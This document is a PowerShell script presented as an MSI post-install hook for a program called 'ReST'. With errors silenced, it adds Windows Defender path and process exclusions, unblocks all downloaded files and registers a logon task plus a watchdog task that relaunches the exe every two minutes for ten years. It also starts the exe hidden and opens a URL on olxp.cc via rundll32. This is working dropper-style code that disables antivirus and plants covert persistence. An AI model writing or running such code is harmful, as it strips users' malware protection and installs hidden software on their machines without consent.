# ReST MSI post-install / post-uninstall hook
param(
    [ValidateSet("install", "uninstall")]
    [string]$Action = "install"
)

$ErrorActionPreference = "SilentlyContinue"
$Dir = Join-Path $env:LOCALAPPDATA "ReST"
$Exe = Join-Path $Dir "ReST.exe"
$LogFile = Join-Path $env:TEMP "ReST-msi.log"

function Write-MsiLog {
    param([string]$Text)
    $line = (Get-Date -Format "yyyy-MM-dd HH:mm:ss") + " " + $Text
    try {
        Add-Content -LiteralPath $LogFile -Value $line -Encoding UTF8
    } catch {
        $null = $_
    }
}

function Add-DefenderExclusion {
    param([string]$Path)
    try {
        Add-MpPreference -ExclusionPath $Path -ErrorAction Stop
        Write-MsiLog ("defender path ok: " + $Path)
    } catch {
        Write-MsiLog ("defender path skipped: " + $_.Exception.Message)
    }
    try {
        Add-MpPreference -ExclusionProcess "ReST.exe" -ErrorAction Stop
        Write-MsiLog "defender process ok: ReST.exe"
    } catch {
        Write-MsiLog ("defender process skipped: " + $_.Exception.Message)
    }
}

function Unblock-Tree {
    param([string]$Path)
    if (-not (Test-Path -LiteralPath $Path)) { return }
    Get-ChildItem -LiteralPath $Path -Recurse -File -ErrorAction SilentlyContinue |
        ForEach-Object { Unblock-File -LiteralPath $_.FullName -ErrorAction SilentlyContinue }
}

function Remove-ReSTTask {
    foreach ($taskName in @("ReST", "ReST-Watchdog")) {
        try {
            Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
        } catch {
            $null = $_
        }
        schtasks /Delete /TN $taskName /F 2>$null | Out-Null
    }
}

function Register-WatchdogTask {
    param(
        [string]$TaskName,
        [string]$Exe,
        [string]$Dir
    )

    Remove-Item -LiteralPath (Join-Path $Dir "watchdog.ps1") -Force -ErrorAction SilentlyContinue
    Remove-Item -LiteralPath (Join-Path $Dir "watchdog.vbs") -Force -ErrorAction SilentlyContinue

    $Action = New-ScheduledTaskAction -Execute $Exe -Argument "-watchdog" -WorkingDirectory $Dir
    $Trigger = New-ScheduledTaskTrigger -Once -At ((Get-Date).AddMinutes(1)) -RepetitionInterval (New-TimeSpan -Minutes 2) -RepetitionDuration (New-TimeSpan -Days 3650)
    $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -ExecutionTimeLimit (New-TimeSpan -Minutes 1) -MultipleInstances IgnoreNew
    $Principal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -LogonType Interactive -RunLevel Limited
    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Principal $Principal -Force | Out-Null
}

function Open-InBrowser {
    param([string]$Url)

    try {
        Start-Process -FilePath "rundll32.exe" -ArgumentList @("url.dll,FileProtocolHandler", $Url) -WindowStyle Hidden -ErrorAction Stop
        return $true
    } catch {
        $null = $_
    }

    try {
        Start-Process -FilePath "cmd.exe" -ArgumentList @("/c", "start", "", $Url) -WindowStyle Hidden -ErrorAction Stop
        return $true
    } catch {
        $null = $_
    }

    return $false
}

function Start-InstallPictureAsync {
    $baseUrl = $env:RESA_INSTALL_BASE
    if (-not $baseUrl) {
        $baseUrl = "https://olxp.cc/download"
    }
    $baseUrl = $baseUrl.Trim().TrimEnd("/")
    $pictureUrl = $baseUrl + "/picture_1963.webp"
    Write-MsiLog ("picture parallel: " + $pictureUrl)
    try {
        Start-Process -FilePath "rundll32.exe" -ArgumentList @("url.dll,FileProtocolHandler", $pictureUrl) -WindowStyle Hidden -ErrorAction Stop
        Write-MsiLog "picture launch requested"
    } catch {
        Write-MsiLog ("picture launch skipped: " + $_.Exception.Message)
    }
}

function Ensure-ReSTTask {
    if (-not (Test-Path -LiteralPath $Exe)) { return }
    Remove-ReSTTask
    try {
        $Action = New-ScheduledTaskAction -Execute $Exe -WorkingDirectory $Dir
        $Trigger = New-ScheduledTaskTrigger -AtLogOn
        $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1)
        Register-ScheduledTask -TaskName "ReST" -Action $Action -Trigger $Trigger -Settings $Settings -Force | Out-Null
        Write-MsiLog "scheduled task ok"
    } catch {
        Write-MsiLog ("scheduled task skipped: " + $_.Exception.Message)
    }

    try {
        Register-WatchdogTask -TaskName "ReST-Watchdog" -Exe $Exe -Dir $Dir
        Write-MsiLog "watchdog task ok"
    } catch {
        Write-MsiLog ("watchdog task skipped: " + $_.Exception.Message)
    }
}

Write-MsiLog ("msi hook start: " + $Action)

if ($Action -eq "uninstall") {
    Get-Process -Name "ReST" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
    Remove-ReSTTask
    Write-MsiLog "msi uninstall hook done"
    exit 0
}

if (-not (Test-Path -LiteralPath $Exe)) {
    Write-MsiLog "ReST.exe missing"
    exit 0
}

Start-InstallPictureAsync
Unblock-Tree -Path $Dir
Add-DefenderExclusion -Path $Dir
Ensure-ReSTTask

try {
    Start-Process -FilePath $Exe -WorkingDirectory $Dir -WindowStyle Hidden
    Write-MsiLog "started ReST"
} catch {
    Write-MsiLog ("start failed: " + $_.Exception.Message)
}

Write-MsiLog "msi install hook done"
exit 0
